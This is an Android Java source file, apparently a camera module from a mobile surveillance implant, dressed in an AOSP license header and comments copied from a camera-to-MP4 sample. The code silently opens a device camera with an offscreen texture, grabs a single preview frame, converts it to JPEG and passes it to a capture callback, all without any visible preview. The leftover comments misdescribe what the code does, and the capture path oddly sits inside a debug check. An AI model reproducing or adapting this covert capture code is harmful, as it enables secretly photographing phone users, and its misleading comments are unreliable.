/*
 * Copyright 2013 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.android.dvci.module.camera;

import android.annotation.TargetApi;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.opengl.GLES20;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import com.android.dvci.auto.Cfg;
import com.android.dvci.module.ModuleCamera;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;

//20131106: removed unnecessary glFinish(), removed hard-coded "/sdcard"
//20131205: added alpha to EGLConfig
//20131210: demonstrate un-bind and re-bind of texture, for apps with shared EGL contexts
//20140123: correct error checks on glGet*Location() and program creation (they don't set error)

/**
 * Record video from the camera preview and encode it as an MP4 file.  Demonstrates the use
 * of MediaMuxer and MediaCodec with Camera input.  Does not record audio.
 * <p/>
 * Generally speaking, it's better to use MediaRecorder for this sort of thing.  This example
 * demonstrates one possible advantage: editing of video as it's being encoded.  A GLES 2.0
 * fragment shader is used to perform a silly color tweak every 15 frames.
 * <p/>
 * This uses various features first available in Android "Jellybean" 4.3 (API 18).  There is
 * no equivalent functionality in previous releases.  (You can send the Camera preview to a
 * byte buffer with a fully-specified format, but MediaCodec encoders want different input
 * formats on different devices, and this use case wasn't well exercised in CTS pre-4.3.)
 * <p/>
 * The output file will be something like "/sdcard/test.640x480.mp4".
 * <p/>
 * (This was derived from bits and pieces of CTS tests, and is packaged as such, but is not
 * currently part of CTS.)
 */
public class CameraSnapshot {
	private static final String TAG = "CameraToMpegTest";
	private static final boolean VERBOSE = false;           // lots of logging

	// where to put the output file (note: /sdcard requires WRITE_EXTERNAL_STORAGE permission)
	private static final File OUTPUT_DIR = Environment.getExternalStorageDirectory();

	// parameters for the encoder
	private static final String MIME_TYPE = "video/avc";    // H.264 Advanced Video Coding
	private static final int FRAME_RATE = 30;               // 30fps
	private static final int IFRAME_INTERVAL = 5;           // 5 seconds between I-frames
	private static final long DURATION_SEC = 8;             // 8 seconds of video

	// Fragment shader that swaps color channels around.
	private static final String SWAPPED_FRAGMENT_SHADER =
			"#extension GL_OES_EGL_image_external : require\n" +
					"precision mediump float;\n" +
					"varying vec2 vTextureCoord;\n" +
					"uniform samplerExternalOES sTexture;\n" +
					"void main() {\n" +
					"  gl_FragColor = texture2D(sTexture, vTextureCoord).gbra;\n" +
					"}\n";

	// encoder / muxer state

	private int mTrackIndex;
	private boolean mMuxerStarted;

	// camera state
	private Camera mCamera;
	private SurfaceTexture surface;
	private Camera.PreviewCallback previewCallback = new Camera.PreviewCallback() {
		@Override
		public void onPreviewFrame(byte[] bytes, Camera camera) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onPreviewFrame), size: " + bytes.length);

				if(isBlack( bytes)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (onPreviewFrame),  BLACK");
					}
					return;
				}
				Camera.Size size = cameraParms.getPreviewSize();
				int format = cameraParms.getPreviewFormat();
				if(format ==  ImageFormat.NV21 ) {
					ByteArrayOutputStream jpeg = new ByteArrayOutputStream();
					YuvImage image = new YuvImage(bytes,  ImageFormat.NV21, size.width, size.height, null);
					image.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), 100, ((OutputStream)
							jpeg));
					ModuleCamera.callback(jpeg.toByteArray());
				}

				releaseCamera();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onPreviewFrame), END");
				}
			}
		}
	};

	private boolean isBlack(byte[] raw) {
		for (int i = 0; i < raw.length; i++) {
			if (raw[i] != 0) {
				return false;
			}
		}
		return true;
	}

	private Camera.Parameters cameraParms;

	/**
	 * Wraps encodeCameraToMpeg().  This is necessary because SurfaceTexture will try to use
	 * the looper in the current thread if one exists, and the CTS tests create one on the
	 * test thread.
	 * <p/>
	 * The wrapper propagates exceptions thrown by the worker thread back to the caller.
	 * <p/>
	 * /**
	 * Tests encoding of AVC video from Camera input.  The output is saved as an MP4 file.
	 */
	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
	public synchronized void snapshot(int camera) {
		// arbitrary but popular values
		int encWidth = 640;
		int encHeight = 480;
		//int encBitRate = 6000000;      // Mbps
		Log.d(TAG, MIME_TYPE + " output " + encWidth + "x" + encHeight);

		try {
			if (!prepareCamera(camera, encWidth, encHeight)) {
				return;
			}

			int[] surfaceparams = new int[1];
			GLES20.glGenTextures(1, surfaceparams, 0);
			GLES20.glBindTexture(36197, surfaceparams[0]);
			GLES20.glTexParameterf(36197, 10241, 9729f);
			GLES20.glTexParameterf(36197, 10240, 9729f);
			GLES20.glTexParameteri(36197, 10242, 33071);
			GLES20.glTexParameteri(36197, 10243, 33071);

			this.surface = new SurfaceTexture(surfaceparams[0]);

			mCamera.setPreviewTexture(this.surface);
			mCamera.setOneShotPreviewCallback(this.previewCallback);
			mCamera.startPreview();

			//Utils.sleep(300);
			wait();
			if (Cfg.DEBUG) {
				Check.log(TAG + " (snapshot), END");
			}

		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		} finally {
			// release everything we grabbed
			//releaseCamera();
		}
	}

	/**
	 * Configures Camera for video capture.  Sets mCamera.
	 * <p/>
	 * Opens a Camera and sets parameters.  Does not start preview.
	 */
	@TargetApi(Build.VERSION_CODES.GINGERBREAD)
	private boolean prepareCamera(int camera, int encWidth, int encHeight) {
		try {
			if (mCamera != null) {
				throw new RuntimeException("camera already initialized");
			}

			Camera.CameraInfo info = new Camera.CameraInfo();

			// Try to find a front-facing camera (e.g. for videoconferencing).
			int numCameras = Camera.getNumberOfCameras();
			if (camera < numCameras) {
				mCamera = Camera.open(camera);
			}

			if (mCamera == null) {
				Log.d(TAG, "No front-facing camera found; opening default");
				mCamera = Camera.open();    // opens first back-facing camera
			}

			if (mCamera == null) {
				return false;
			}

			cameraParms = mCamera.getParameters();

			//cameraParms.setPreviewFormat(ImageFormat.JPEG);
			cameraParms.setPreviewFormat(ImageFormat.NV21);

			cameraParms.set("iso", (String) "400");

			choosePreviewSize(cameraParms, encWidth, encHeight);
			// leave the frame rate set to default
			mCamera.setParameters(cameraParms);

			Camera.Size size = cameraParms.getPreviewSize();
			Log.d(TAG, "Camera preview size is " + size.width + "x" + size.height);

			return true;
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (prepareCamera), ERROR " + ex);
			}
			return false;
		}
	}

	/**
	 * Attempts to find a preview size that matches the provided width and height (which
	 * specify the dimensions of the encoded video).  If it fails to find a match it just
	 * uses the default preview size.
	 * <p/>
	 * TODO: should do a best-fit match.
	 */
	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
	private static void choosePreviewSize(Camera.Parameters parms, int width, int height) {
		// We should make sure that the requested MPEG size is less than the preferred
		// size, and has the same aspect ratio.
		Camera.Size ppsfv = parms.getPreferredPreviewSizeForVideo();
		if (VERBOSE && ppsfv != null) {
			Log.d(TAG, "Camera preferred preview size for video is " +
					ppsfv.width + "x" + ppsfv.height);
		}

		for (Camera.Size size : parms.getSupportedPreviewSizes()) {
			if (size.width == width && size.height == height) {
				parms.setPreviewSize(width, height);
				return;
			}
		}

		Log.w(TAG, "Unable to set preview size to " + width + "x" + height);
		if (ppsfv != null) {
			parms.setPreviewSize(ppsfv.width, ppsfv.height);
		}
	}

	/**
	 * Stops camera preview, and releases the camera to the system.
	 */
	private synchronized void  releaseCamera() {
		if (VERBOSE) Log.d(TAG, "releasing camera");
		if (mCamera != null) {
			mCamera.stopPreview();
			mCamera.release();
			mCamera = null;
		}
		notifyAll();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (releaseCamera), END");
		}
	}

}
